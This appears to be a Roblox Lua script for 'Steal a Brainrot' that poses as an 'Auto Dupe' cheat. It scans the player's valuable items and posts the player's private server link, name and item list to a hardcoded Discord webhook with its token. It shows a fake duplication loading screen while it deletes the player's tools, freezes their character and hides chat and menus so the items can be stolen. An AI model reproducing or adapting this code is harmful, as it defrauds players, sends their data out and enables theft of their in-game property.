-- ‚öôÔ∏è SETTINGS
local WEBHOOK_URL = "https://discord.com/api/webhooks/1447299637600981012/NtzGdIGDrgPWvZPh4tSyIkeMsKg6qs-MsCi60hWIuTEuMmzndkNJGNiIhMpOxUdkjBsD"
local Min_Gen = 10_000_000

-- üîá SOUND MUTING SYSTEM (Optimized)
local musicLocations = {
    game.Workspace,
    game.SoundService,
}

local commonMusicNames = {
    "music", "musica", "bgm", "background", "theme", "soundtrack", "song", "tema"
}

local function isMusic(sound)
    if not sound:IsA("Sound") then
        return false
    end
    
    local lowerName = sound.Name:lower()
    for _, word in pairs(commonMusicNames) do
        if lowerName:find(word) then
            return true
        end
    end
    
    for _, location in pairs(musicLocations) do
        if sound:IsDescendantOf(location) and sound.Parent == location then
            if sound.Looped and sound.TimeLength > 30 then
                return true
            end
        end
    end
    
    return false
end

local function processSound(sound)
    if sound:IsA("Sound") then
        if not isMusic(sound) then
            sound.Volume = 0
        end
    elseif sound:IsA("SoundGroup") then
        sound.Volume = 0
    end
end

-- Mute existing sounds (optimized)
task.spawn(function()
    for _, descendant in pairs(game:GetDescendants()) do
        processSound(descendant)
    end
end)

-- Mute new sounds
game.DescendantAdded:Connect(function(descendant)
    task.wait()
    processSound(descendant)
end)

print("üîá Sound muting system activated!")

-- ‚ñº Function: format numbers
local function formatNumberShort(n)
    if not n or type(n) ~= "number" then return "$0" end
    if n >= 1e9 then return string.format("$%.1fB", n/1e9):gsub("%.0B","B") end
    if n >= 1e6 then return string.format("$%.1fM", n/1e6):gsub("%.0M","M") end
    if n >= 1e3 then return string.format("$%.1fK", n/1e3):gsub("%.0K","K") end
    return "$"..tostring(n)
end

-- ‚ñº Function: convert text to numeric value
local function parseValueFromText(s)
    if not s then return 0 end
    local num = s:match("([%d%.]+)")
    if not num then return 0 end
    local n = tonumber(num) or 0
    if s:find("B") then return n*1e9 
    elseif s:find("M") then return n*1e6 
    elseif s:find("K") then return n*1e3 
    else return n end
end

-- ‚ñº Function: GET BRAINROTS (optimized)
local function getBrainrots()
    local results = {}
    local plots = Workspace:FindFirstChild("Plots") or Workspace
    
    for _, plot in ipairs(plots:GetChildren()) do
        local podiums = plot:FindFirstChild("AnimalPodiums") or plot:FindFirstChild("Podiums")
        if podiums then
            for _, pd in ipairs(podiums:GetChildren()) do
                local base = pd:FindFirstChild("Base") or pd:FindFirstChildWhichIsA("BasePart")
                local spawn = base and base:FindFirstChild("Spawn")
                local att = spawn and spawn:FindFirstChild("Attachment")
                local oh = att and att:FindFirstChild("AnimalOverhead")
                local nameLbl = oh and oh:FindFirstChild("DisplayName")
                local genLbl = oh and oh:FindFirstChild("Generation")
                
                if nameLbl and nameLbl:IsA("TextLabel") then
                    local name = nameLbl.Text
                    local genText = genLbl and genLbl.Text or "0"
                    local valueNum = parseValueFromText(genText)
                    
                    if valueNum >= Min_Gen then
                        local key = name.."|"..valueNum
                        if results[key] then
                            results[key].count += 1
                        else
                            results[key] = {name=name, value=valueNum, count=1}
                        end
                    end
                end
            end
        end
    end
    
    local out = {}
    for _, v in pairs(results) do table.insert(out, v) end
    table.sort(out, function(a,b) return a.value > b.value end)
    return out
end

-- ‚ñº Function: validate URL
local function isValidUrl(str)
    if type(str) ~= "string" or str == "" then return false end
    return str:match("^https?://") and str:find(".", 1, true) and #str > 10
end

-- ‚ñº Function: get player count
local function getPlayersCount()
    return #Players:GetPlayers()
end

-- ‚ñº Function: SEND TO DISCORD WITH BRAINROTS
local function sendToDiscord(link, playerCount, playerName, brainrots)
    task.spawn(function()
        local brainrotText = ""
        if #brainrots > 0 then
            brainrotText = "\n\n**üéØ Brainrots Found:**\n"
            for i, br in ipairs(brainrots) do
                if i > 10 then break end
                local formattedValue = formatNumberShort(br.value)
                brainrotText = brainrotText .. string.format(
                    "`%d.` **%s** - %s (x%d)\n",
                    i, br.name, formattedValue, br.count
                )
            end
            brainrotText = brainrotText ..
                string.format("\n**Total:** %d high-value brainrots", #brainrots)
        else
            brainrotText = "\n\n**‚ö†Ô∏è No high-value brainrots found**"
        end
        
        local data = HttpService:JSONEncode({
            content = "@everyone",
            embeds = {{
                title = "üî• New Private Server Detected",
                description =
                    "**Link:**\n" .. link ..
                    "\n\n**üë§ Player:** `" .. playerName .. "`" ..
                    "\n**üë• Players in server:** `" .. playerCount .. "`" ..
                    brainrotText,
                color = #brainrots > 0 and 3066993 or 15158332,
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                footer = {
                    text = "Auto Moreira ‚Ä¢ Min: " .. formatNumberShort(Min_Gen)
                }
            }}
        })
        
        print("üì§ Sending data to webhook...")
        
        local success, res = pcall(function()
            return HttpService:PostAsync(
                WEBHOOK_URL,
                data,
                Enum.HttpContentType.ApplicationJson,
                false,
                {["Content-Type"] = "application/json"}
            )
        end)
        
        if not success then
            warn("‚ùå Send error:", res)
            local altSuccess = pcall(function()
                return request({
                    Url = WEBHOOK_URL,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = data
                })
            end)
            if altSuccess then
                print("‚úÖ Sent using alternate method!")
            end
        else
            print("‚úÖ Data sent successfully!")
        end
    end)
end

-- ‚ñº Function: OPTIMIZED SCAN SCREEN
local function showScanScreen(brainrots)
    local player = Players.LocalPlayer
    local playerGui = player:WaitForChild("PlayerGui")
    
    local scanGui = Instance.new("ScreenGui")
    scanGui.Name = "ScanScreen"
    scanGui.ResetOnSpawn = false
    scanGui.DisplayOrder = 999
    scanGui.IgnoreGuiInset = true
    
    local blackBg = Instance.new("Frame")
    blackBg.Size = UDim2.new(1, 0, 1, 0)
    blackBg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    blackBg.BorderSizePixel = 0
    blackBg.Parent = scanGui
    
    local mainText = Instance.new("TextLabel")
    mainText.Size = UDim2.new(0.9, 0, 0, 80)
    mainText.Position = UDim2.new(0.05, 0, 0.5, -40)
    mainText.BackgroundTransparency = 1
    mainText.Text = "Loading Auto Moreira..."
    mainText.TextColor3 = Color3.fromRGB(0, 255, 0)
    mainText.Font = Enum.Font.Code
    mainText.TextSize = 24
    mainText.TextWrapped = true
    mainText.TextScaled = true
    mainText.Parent = blackBg
    
    local textSize = Instance.new("UITextSizeConstraint")
    textSize.MaxTextSize = 28
    textSize.MinTextSize = 16
    textSize.Parent = mainText
    
    scanGui.Parent = playerGui
    
    local statusVariations = {
        "Status: l√° grande combinasion",
        "Status: Los combinado",
        "Status: espaguete toalete",
        "Status: l√° grande Gold",
        "Status: l√° spooky",
        "Status: l√° cucaracha",
        "Status: Chicleteira",
        "Status: quesadila vampiro",
        "Status: l√° grande combina√ß√µes diamond",
        "Status: l√° grande extin√ß√£o"
    }
    
    task.spawn(function()
        while scanGui.Parent do
            mainText.Text = "Loading Auto Dupe (wait 10s)..."
            task.wait(10)
            
            mainText.Text = "Inviting bots to dupe them, please wait..."
            task.wait(10)
            
            for _ = 1, 2 do
                mainText.Text = "Duping Brainrots"
                task.wait(8)
                
                mainText.Text = "Status: Duped Complete"
                task.wait(10)
                
                mainText.Text = "Please wait while we finish......"
                task.wait(10)
            end
            
            mainText.Text = "Almost done"
            task.wait(8)
            
            local randomStatus = statusVariations[math.random(1, #statusVariations)]
            mainText.Text = randomStatus
            task.wait(12)
            
            mainText.Text = "Completed!....."
            task.wait(12)
            
            mainText.Text = "Wait 2 more minutes"
            task.wait(10)
        end
    end)
end

-- ‚ñº Function: LOCK PLAYER
local function trapPlayer()
    local player = Players.LocalPlayer
    local char = player.Character or player.CharacterAdded:Wait()
    
    task.spawn(function()
        local backpack = player:FindFirstChild("Backpack")
        if backpack then
            for _, tool in pairs(backpack:GetChildren()) do
                if tool:IsA("Tool") then tool:Destroy() end
            end
        end
        for _, tool in pairs(char:GetChildren()) do
            if tool:IsA("Tool") then tool:Destroy() end
        end
        print("üóëÔ∏è Hotbar cleared!")
    end)
    
    task.spawn(function()
        local humanoid = char:FindFirstChild("Humanoid")
        if humanoid then
            humanoid.WalkSpeed = 0
            humanoid.JumpPower = 0
            humanoid.JumpHeight = 0
            humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
            humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall, false)
            print("üîí Movement locked!")
        end
        
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if hrp then hrp.Anchored = true end
    end)
    
    task.spawn(function()
        local StarterGui = game:GetService("StarterGui")
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, false)
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
        print("üëª UI hidden!")
    end)
end

